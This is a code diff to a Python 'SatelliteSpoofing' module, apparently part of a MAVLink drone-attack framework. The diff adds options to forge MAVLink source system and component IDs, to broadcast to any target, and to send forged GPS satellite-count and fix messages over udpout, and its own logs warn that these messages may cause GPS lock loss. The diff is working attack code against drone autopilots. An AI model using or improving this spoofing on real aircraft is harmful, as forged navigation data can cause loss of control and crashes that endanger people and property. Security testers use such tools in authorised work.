@@ -3,6 +3,10 @@ from lib.base import MAVLinkModule
 from pymavlink import mavutil
 import time
 import random
+import os
+
+# Force MAVLink 2.0 (critical for proper message routing)
+os.environ['MAVLINK20'] = '1'
 
 class SatelliteSpoofing(MAVLinkModule):
     """
@@ -10,12 +14,13 @@ class SatelliteSpoofing(MAVLinkModule):
     about the number of visible satellites and GPS signal quality.
 
     Connection:
-        Supports both network and serial connections:
-        - Network: udp:10.13.0.6:14550 or tcp:10.13.0.6:5760
+        For spoofing, use 'udpout:' to send TO the target port:
+        - Network (recommended): udpout:10.13.0.6:14550
+        - Network (bidirectional): udp:10.13.0.6:14550
         - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)
 
     Usage:
-        set connection udp:10.13.0.6:14550
+        set connection udpout:10.13.0.6:14550
         set satellites 0
         set fix_type 0
         run
@@ -78,6 +83,26 @@ class SatelliteSpoofing(MAVLinkModule):
             description='GPS update rate in Hz',
             required=False,
         ): "1",  # Default: 1 Hz
+        Option(
+            name='src_system_id',
+            description='Source system ID to spoof (what system the message appears from)',
+            required=False,
+        ): "1",  # Default: System 1
+        Option(
+            name='src_component_id',
+            description='Source component ID to spoof (what component the message appears from)',
+            required=False,
+        ): "1",  # Default: Component 1
+        Option(
+            name='tgt_system_id',
+            description='Target system ID (who to send to, 0 for broadcast)',
+            required=False,
+        ): "0",  # Default: Broadcast
+        Option(
+            name='tgt_component_id',
+            description='Target component ID (which component to target, 0 for broadcast)',
+            required=False,
+        ): "0",  # Default: Broadcast
     })
 
     def send_heartbeat(self, master):
@@ -160,6 +185,10 @@ class SatelliteSpoofing(MAVLinkModule):
         velocity = int(self.config['velocity'])
         duration = int(self.config['duration'])
         update_rate = int(self.config['update_rate'])
+        src_system_id = int(self.config['src_system_id'])
+        src_component_id = int(self.config['src_component_id'])
+        tgt_system_id = int(self.config['tgt_system_id'])
+        tgt_component_id = int(self.config['tgt_component_id'])
 
         # Validate satellite count
         if satellites < 0 or satellites > 20:
@@ -178,6 +207,8 @@ class SatelliteSpoofing(MAVLinkModule):
         self.logger.info(f"HDOP (horizontal accuracy): {eph} cm")
         self.logger.info(f"VDOP (vertical accuracy): {epv} cm")
         self.logger.info(f"Update Rate: {update_rate} Hz")
+        self.logger.info(f"Source: System ID {src_system_id}, Component ID {src_component_id}")
+        self.logger.info(f"Target: System ID {tgt_system_id}, Component ID {tgt_component_id}")
         if duration > 0:
             self.logger.info(f"Duration: {duration} seconds")
         else:
@@ -189,13 +220,16 @@ class SatelliteSpoofing(MAVLinkModule):
         elif satellites < 4:
             self.logger.warning(f"WARNING: {satellites} satellites may cause GPS lock loss!")
 
+        master = None
         try:
             # Connect to the MAVLink device (supports both serial and network)
             master = self.connect_drone()
 
-            # Set spoofed system ID
-            master.source_system = 1
-            master.source_component = 1
+            # Set spoofed source and target IDs
+            master.source_system = src_system_id
+            master.source_component = src_component_id
+            master.target_system = tgt_system_id
+            master.target_component = tgt_component_id
 
             start_time = time.time()
             count = 0
